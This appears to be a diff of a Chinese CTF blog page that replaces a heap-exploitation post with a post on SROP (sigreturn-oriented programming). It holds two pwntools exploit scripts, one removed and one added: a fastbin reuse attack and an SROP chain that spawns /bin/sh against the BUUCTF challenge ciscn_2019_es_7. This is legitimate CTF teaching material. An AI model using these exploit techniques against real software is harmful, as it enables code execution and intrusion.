@@ -5,34 +5,34 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title class="pjax-title">pwn初学者的进阶（三）：堆学习 - zyleo&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="pwn初学者的进阶（三）：堆学习" />
-<meta property="og:description" content="0x00 前言 零零散散地看了两三天时间才把堆的一些基础内容与一道题看懂😑 0x01 picoctf_2018_are you root 题目链接 感天动地，我居然自己做出了一道堆题，虽然这题非常简单。 每次l" />
+    <title class="pjax-title">pwn初学者的进阶（四）：SROP - zyleo&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="pwn初学者的进阶（四）：SROP" />
+<meta property="og:description" content="SROP，听着似乎是一个非常高大上的ROP方式，再加上涉及到signal和内核等概念，很容易给人一种难以理解的第一印象。但看过ctf-wiki之后你会发现，原理非常简单易懂。" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://liuliuliuzy.github.io/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-09-06T14:36:30+08:00" />
 <meta property="article:modified_time" content="2021-09-06T14:36:30+08:00" />
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="pwn初学者的进阶（三）：堆学习"/>
-<meta name="twitter:description" content="0x00 前言 零零散散地看了两三天时间才把堆的一些基础内容与一道题看懂😑 0x01 picoctf_2018_are you root 题目链接 感天动地，我居然自己做出了一道堆题，虽然这题非常简单。 每次l"/>
+<meta name="twitter:title" content="pwn初学者的进阶（四）：SROP"/>
+<meta name="twitter:description" content="SROP，听着似乎是一个非常高大上的ROP方式，再加上涉及到signal和内核等概念，很容易给人一种难以理解的第一印象。但看过ctf-wiki之后你会发现，原理非常简单易懂。"/>
 <meta name="application-name" content="zyleo">
 <meta name="apple-mobile-web-app-title" content="zyleo">
 
 <meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://liuliuliuzy.github.io/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" /><link rel="prev" href="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" /><link rel="next" href="https://liuliuliuzy.github.io/2021-09-26-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%B8%89%E7%89%88/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://liuliuliuzy.github.io/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" /><link rel="prev" href="https://liuliuliuzy.github.io/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" /><link rel="next" href="https://liuliuliuzy.github.io/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
     <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
     <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "pwn初学者的进阶（三）：堆学习",
+        "headline": "pwn初学者的进阶（四）：SROP",
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/liuliuliuzy.github.io\/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95\/"
-        },"genre": "posts","keywords": "CTF, pwn, 堆","wordcount":  642 ,
-        "url": "https:\/\/liuliuliuzy.github.io\/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95\/","datePublished": "2021-09-06T14:36:30+08:00","dateModified": "2021-09-06T14:36:30+08:00","publisher": {
+            "@id": "https:\/\/liuliuliuzy.github.io\/2021-11-01-srop%E5%AD%A6%E4%B9%A0\/"
+        },"genre": "posts","keywords": "CTF, pwn, Linux, Signal, Kernel","wordcount":  1313 ,
+        "url": "https:\/\/liuliuliuzy.github.io\/2021-11-01-srop%E5%AD%A6%E4%B9%A0\/","datePublished": "2021-09-06T14:36:30+08:00","dateModified": "2021-09-06T14:36:30+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
@@ -125,12 +125,12 @@
             <div class="container"><div class="toc" id="toc-auto">
         <h2 class="toc-title">目录</h2>
         <div class="toc-content" id="toc-content-auto"></div>
-    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">pwn初学者的进阶（三）：堆学习</h1><div class="post-meta">
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">pwn初学者的进阶（四）：SROP</h1><div class="post-meta">
             <div class="post-meta-line">
                 <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author">zyleo</a>
                 </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-09-06">2021-09-06</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-09-06">2021-09-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 642 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;<span id="/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" class="leancloud_visitors" data-flag-title="pwn初学者的进阶（三）：堆学习">
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-09-06">2021-09-06</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-09-06">2021-09-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1313 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;<span id="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/" class="leancloud_visitors" data-flag-title="pwn初学者的进阶（四）：SROP">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
                     </span>&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
@@ -140,86 +140,62 @@
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#0x00-前言">0x00 前言</a></li>
-    <li><a href="#0x01-picoctf_2018_are-you-root">0x01 picoctf_2018_are you root</a></li>
-    <li><a href="#0x02-hitcon2014_stkof">0x02 hitcon2014_stkof</a></li>
+    <li><a href="#基本原理">基本原理</a></li>
+    <li><a href="#例题">例题</a></li>
+    <li><a href="#思考">思考</a></li>
+    <li><a href="#参考链接">参考链接：</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><h2 id="0x00-前言">0x00 前言</h2>
-<p>零零散散地看了两三天时间才把堆的一些基础内容与一道题看懂😑</p>
-<h2 id="0x01-picoctf_2018_are-you-root">0x01 picoctf_2018_are you root</h2>
-<p><a href="https://buuoj.cn/challenges#picoctf_2018_are%20you%20root" target="_blank" rel="noopener noreffer">题目链接</a></p>
-<p>感天动地，我居然自己做出了一道堆题，虽然这题非常简单。</p>
-<p>每次<code>login</code>的时候，chunk布局如下所示（假设输入用户名长度&lt;=0x18）：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">------------------
-|       |  0x21 |  allocated
------------------
-|str_ptr| level |
-------------------
-|       |  0x21 |  allocated
------------------
-| str content.. |
-------------------
-    top chunk
-</code></pre></td></tr></table>
-</div>
-</div><p>这题的漏洞点在于，<code>malloc</code>与<code>free</code>的次数不匹配。程序中写入用户名时使用了<code>strdup</code>，**这个函数是隐含着<code>malloc</code>的调用的，而<code>reset</code>时又只进行了一次<code>free</code>调用。所以，正常的一次<code>login</code>与<code>reset</code>操作之后，chunk与fastbin的情况为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">------------------
-|       |  0x21 |  allocated
------------------
-|str_ptr| level |
-------------------
-|       |  0x21 |  free
------------------
-| str content.. |
-------------------
-    top chunk
-
-===================
-fastbin: -&gt; -----------------
-            |       |  0x21 | 
-            -----------------
-            | str content.. |
-            ------------------
-</code></pre></td></tr></table>
-</div>
-</div><p>所以这时再进行<code>login</code>，得到的就是写入了用户名内容的chunk，这是我们可控的。而代表auth-level的值就位于<code>ptr+0x8</code>，我们只要在第一次<code>login</code>的时候，把该处内容写为<code>\x05\x00\x00\x00\x00\x00\x00\x00</code>，然后<code>reset</code>，再<code>login</code>即可。</p>
-<p>exp</p>
+            </div><div class="content" id="content"><p>SROP，听着似乎是一个非常高大上的ROP方式，再加上涉及到signal和内核等概念，很容易给人一种难以理解的第一印象。但看过<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/" target="_blank" rel="noopener noreffer">ctf-wiki</a>之后你会发现，原理非常简单易懂。</p>
+<h2 id="基本原理">基本原理</h2>
+<p>SROP与Unix系统的信号（signal）处理机制相关。关于Unix系统的信号处理、中断、用户态内核态等概念，忘了的话建议先去google一下。理解这些东西才能够更好地理解SROP的工作原理。</p>
+<p>首先盗一张ctf-wiki上关于信号处理过程的流程图。</p>
+<p><figure><a class="lightgallery" href="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/ProcessOfSignalHandlering.png" title="img" data-thumbnail="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/ProcessOfSignalHandlering.png" data-sub-html="<h2>Procedure of signal handling</h2><p>img</p>">
+        <img
+            class="lazyload"
+            data-src="ProcessOfSignalHandlering.png"
+            data-srcset="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/ProcessOfSignalHandlering.png, ProcessOfSignalHandlering.png 1.5x, /2021-11-01-srop%E5%AD%A6%E4%B9%A0/ProcessOfSignalHandlering.png 2x"
+            data-sizes="auto"
+            alt="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/ProcessOfSignalHandlering.png"
+        />
+    </a><figcaption class="image-caption">Procedure of signal handling</figcaption>
+    </figure></p>
+<p>几个阶段分别发生了什么：</p>
+<ul>
+<li>①：用户态进程接收到别的进程发送的信号signal，该进程被挂起，进入内核态</li>
+<li>②：内核保存用户态进程的上下文，然后跳转到用户态的信号对应的信号处理程序，回到用户态。在这一阶段里，内核会构造一个位于用户态进程栈上的<code>Signal Frame</code>用于存放该进程的上下文，然后再压入返回地址<code>rt_sigreturn</code>。</li>
+<li>③：用户态的信号处理程序执行完毕，pop返回地址<code>rt_sigreturn</code>，进程进入内核态，执行<code>sigreturn</code>系统调用。内核根据之前栈上的<code>Signal Frame</code>完成用户态进程上下文的恢复。</li>
+<li>④：返回用户态，进程按照恢复的上下文继续执行。</li>
+</ul>
+<p>SROP作用于第3阶段，也就是内核根据<code>Signal Frame</code>的内容恢复进程上下文的过程。</p>
+<p><code>Signal Frame</code>是一个已知的数据结构，而且其存在于用户态的栈上。内核在恢复上下文时并没有确保其内容没有被修改过。因此，如果我们能够在栈上构造<code>sigreturn</code>系统调用与<code>Signal Frame</code>结构体的话，就能够实现攻击的效果。</p>
+<p>比如在栈上构造这么一个结构，就能够SROP获取shell。</p>
+<p><figure><a class="lightgallery" href="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/srop-example-1.png" title="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/srop-example-1.png" data-thumbnail="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/srop-example-1.png" data-sub-html="<h2>example</h2>">
+        <img
+            class="lazyload"
+            data-src="srop-example-1.png"
+            data-srcset="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/srop-example-1.png, srop-example-1.png 1.5x, /2021-11-01-srop%E5%AD%A6%E4%B9%A0/srop-example-1.png 2x"
+            data-sizes="auto"
+            alt="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/srop-example-1.png"
+        />
+    </a><figcaption class="image-caption">example</figcaption>
+    </figure></p>
+<h2 id="例题">例题</h2>
+<p>Buu上的<a href="https://buuoj.cn/challenges#ciscn_2019_es_7" target="_blank" rel="noopener noreffer">ciscn_2019_es_7</a>就是一个典型的例子。</p>
+<p>程序允许<code>0x400-0x10</code>长度的栈溢出，并且提供了<code>mov rax 0x3b; ret</code>和<code>syscall</code>以及<code>pop rdi</code>/<code>pop rsi</code>的gadget，但是就是没有控制rdx的gadget。所以无法直接栈溢出ret2syscall。</p>
+<p>再考虑到这么长的溢出长度，以及<code>mov rax 0x0f; ret</code>的gadget（0xf号系统调用就是sigreturn），所以应该想到SROP。</p>
+<p><figure><a class="lightgallery" href="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/image-20211101200337067.png" title="image-20211101200337067" data-thumbnail="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/image-20211101200337067.png" data-sub-html="<h2>gadgets</h2><p>image-20211101200337067</p>">
+        <img
+            class="lazyload"
+            data-src="image-20211101200337067.png"
+            data-srcset="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/image-20211101200337067.png, image-20211101200337067.png 1.5x, /2021-11-01-srop%E5%AD%A6%E4%B9%A0/image-20211101200337067.png 2x"
+            data-sizes="auto"
+            alt="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/image-20211101200337067.png"
+        />
+    </a><figcaption class="image-caption">gadgets</figcaption>
+    </figure></p>
+<p>根据上面的例子，如果想要SROP执行<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>的话，还需要知道字符串<code>&quot;/bin/sh&quot;</code>的地址。在这道题中，可以利用<code>sys_write</code>输出的栈地址来获取。</p>
+<p>最终exp：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -247,49 +223,79 @@ fastbin: -&gt; -----------------
 </span><span class="lnt">23
 </span><span class="lnt">24
 </span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
-<span class="c1"># context.log_level = &#39;debug&#39;</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">29378</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ciscn_2019_es_7&#39;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node4.buuoj.cn&#39;</span><span class="p">,</span> <span class="mi">26270</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your command:</span><span class="se">\n</span><span class="s1">&gt; &#39;</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;get-flag&#39;</span><span class="p">)</span>
+<span class="n">syscall_ret</span> <span class="o">=</span> <span class="mh">0x400517</span>
+<span class="n">mov_rax_0x3b_ret</span> <span class="o">=</span> <span class="mh">0x4004e2</span> <span class="c1"># execve</span>
+<span class="n">mov_rax_0x0f_ret</span> <span class="o">=</span> <span class="mh">0x4004da</span> <span class="c1"># sigreturn</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x40051d</span>
+<span class="n">call_vuln</span> <span class="o">=</span> <span class="mh">0x400531</span>
+<span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x4004f1</span>
 
-<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">content</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your command:</span><span class="se">\n</span><span class="s1">&gt; &#39;</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;login &#39;</span> <span class="o">+</span> <span class="n">content</span><span class="p">)</span>
+<span class="c1"># first time</span>
+<span class="n">pld1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">pld1</span> <span class="o">=</span> <span class="n">pld1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">pld1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pld1</span><span class="p">)</span>
 
-<span class="k">def</span> <span class="nf">reset</span><span class="p">():</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter your command:</span><span class="se">\n</span><span class="s1">&gt; &#39;</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;reset&#39;</span><span class="p">)</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;stack_addr: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)))</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x05</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="c1"># second time</span>
+<span class="n">pld2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">pld2</span> <span class="o">=</span> <span class="n">pld2</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
+<span class="n">pld2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_0x0f_ret</span><span class="p">)</span>
+<span class="n">pld2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
 
-<span class="n">login</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">reset</span><span class="p">()</span>
-<span class="n">login</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;test&#39;</span><span class="p">)</span>
-<span class="n">get_flag</span><span class="p">()</span>
+<span class="n">sigframe</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x118</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">stack_addr</span>
+<span class="n">sigframe</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_ret</span>
+<span class="c1"># print(sigframe)</span>
+
+<span class="n">pld2</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">sigframe</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pld2</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></td></tr></table>
 </div>
-</div><p><figure><a class="lightgallery" href="/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210906144421764.png" title="image-20210906144421764" data-thumbnail="/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210906144421764.png" data-sub-html="<h2>flag截图</h2><p>image-20210906144421764</p>">
-        <img
-            class="lazyload"
-            data-src="image-20210906144421764.png"
-            data-srcset="/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210906144421764.png, image-20210906144421764.png 1.5x, /2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210906144421764.png 2x"
-            data-sizes="auto"
-            alt="/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/image-20210906144421764.png"
-        />
-    </a><figcaption class="image-caption">flag截图</figcaption>
-    </figure></p>
-<p>ps: <code>#define DWORD __uint32_t</code>，所以<code>DWORD</code>在x86/x64都是<strong>4字节</strong>大小，而不是字面意思的2倍字长。</p>
-<h2 id="0x02-hitcon2014_stkof">0x02 hitcon2014_stkof</h2>
-<p><a href="https://buuoj.cn/challenges#hitcon2014_stkof" target="_blank" rel="noopener noreffer">题目链接</a></p>
-</div><div class="post-footer" id="post-footer">
+</div><h2 id="思考">思考</h2>
+<p>如果<code>Signal Frame</code>完全可控的话，既然可以通过控制<code>rax</code>和<code>rip</code>来执行系统调用，那么如果程序中存在什么后门函数的话，是不是可以通过构造<code>rdi</code>/<code>rsi</code>和<code>rip</code>等寄存器，去执行这些函数呢？还是说内核态会限制一些函数的运行？</p>
+<h2 id="参考链接">参考链接：</h2>
+<ul>
+<li><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/" target="_blank" rel="noopener noreffer">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/</a></li>
+<li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener noreffer">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a></li>
+<li><a href="https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf" target="_blank" rel="noopener noreffer">提出SROP的论文：《Framing Signals—A Return to Portable Shellcode》</a></li>
+</ul></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
@@ -299,23 +305,23 @@ fastbin: -&gt; -----------------
         </div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
-                            <a class="link-to-markdown" href="/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/index.md" target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                            <a class="link-to-markdown" href="/2021-11-01-srop%E5%AD%A6%E4%B9%A0/index.md" target="_blank" rel="noopener noreferrer">阅读原始文档</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="#" onclick="return false;" title="分享到 Twitter" data-sharer="twitter" data-url="https://liuliuliuzy.github.io/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（三）：堆学习" data-hashtags="CTF,pwn,堆"><i class="fab fa-twitter fa-fw"></i></a><a href="#" onclick="return false;" title="分享到 Reddit" data-sharer="reddit" data-url="https://liuliuliuzy.github.io/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/"><i class="fab fa-reddit fa-fw"></i></a><a href="#" onclick="return false;" title="分享到 微博" data-sharer="weibo" data-url="https://liuliuliuzy.github.io/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（三）：堆学习"><i class="fab fa-weibo fa-fw"></i></a><a href="#" onclick="return false;" title="分享到 百度" data-sharer="baidu" data-url="https://liuliuliuzy.github.io/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（三）：堆学习"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg"></i></a><a href="#" onclick="return false;" title="分享到 Evernote" data-sharer="evernote" data-url="https://liuliuliuzy.github.io/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/" data-title="pwn初学者的进阶（三）：堆学习"><i class="fab fa-evernote 